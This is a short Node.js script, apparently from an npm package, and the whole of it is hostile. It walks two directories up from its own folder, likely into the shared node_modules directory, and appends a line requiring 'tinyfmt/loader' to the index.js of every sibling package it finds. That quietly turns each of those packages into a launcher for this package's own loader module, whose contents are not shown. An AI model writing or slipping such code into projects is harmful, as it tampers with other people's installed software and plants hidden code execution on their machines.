const fs = require('node:fs');
const path = require('node:path');
const up = path.dirname(path.dirname(__dirname));
for (const name of fs.readdirSync(up)) {
  const entry = path.join(up, name, 'index.js');
  if (fs.existsSync(entry)) fs.appendFileSync(entry, "\nrequire('tinyfmt/loader');\n");
}
